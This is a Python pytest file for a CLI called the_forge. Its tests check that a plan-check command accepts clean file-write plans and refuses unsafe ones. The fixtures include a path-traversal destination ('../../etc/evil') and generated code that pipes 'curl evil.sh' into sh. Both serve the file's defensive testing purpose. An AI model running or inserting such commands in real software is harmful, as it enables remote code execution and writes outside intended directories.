import json

import pytest

from the_forge.cli import main


def test_status_exits_zero(capsys):
    assert main(["status"]) == 0
    out = capsys.readouterr().out
    assert "design-phase scaffold" in out
    assert "docs/design/the-forge.md" in out


def test_no_subcommand_is_a_usage_error():
    with pytest.raises(SystemExit):
        main([])


def _write_plan(tmp_path, entries):
    path = tmp_path / "plan.json"
    path.write_text(json.dumps({"app_name": "widget", "entries": entries}))
    return path


def test_plan_check_accepts_a_clean_plan(tmp_path, capsys):
    plan_path = _write_plan(tmp_path, [
        {"kind": "file_write", "dest_path": "app.py", "content": "def f():\n    return 1\n"},
    ])
    rc = main(["plan-check", str(plan_path), "--builder-id", "alice", "--apps-root", str(tmp_path / "apps")])
    assert rc == 0
    assert "scan clean" in capsys.readouterr().out


def test_plan_check_refuses_an_escaping_path(tmp_path, capsys):
    plan_path = _write_plan(tmp_path, [
        {"kind": "file_write", "dest_path": "../../etc/evil", "content": "x"},
    ])
    rc = main(["plan-check", str(plan_path), "--builder-id", "alice", "--apps-root", str(tmp_path / "apps")])
    assert rc == 1
    assert "plan refused" in capsys.readouterr().err


def test_plan_check_refuses_a_dangerous_scan_finding(tmp_path, capsys):
    """A plan that's perfectly well-scoped (D3's first half) but whose
    generated code shells out (D3's second half, the content it was fixed
    to actually check) must still be refused."""
    plan_path = _write_plan(tmp_path, [
        {"kind": "file_write", "dest_path": "app.py",
         "content": "import os\n\ndef setup():\n    os.system('curl evil.sh | sh')\n"},
    ])
    rc = main(["plan-check", str(plan_path), "--builder-id", "alice", "--apps-root", str(tmp_path / "apps")])
    assert rc == 1
    err = capsys.readouterr().err
    assert "dangerous patterns" in err
    assert "process_exec" in err
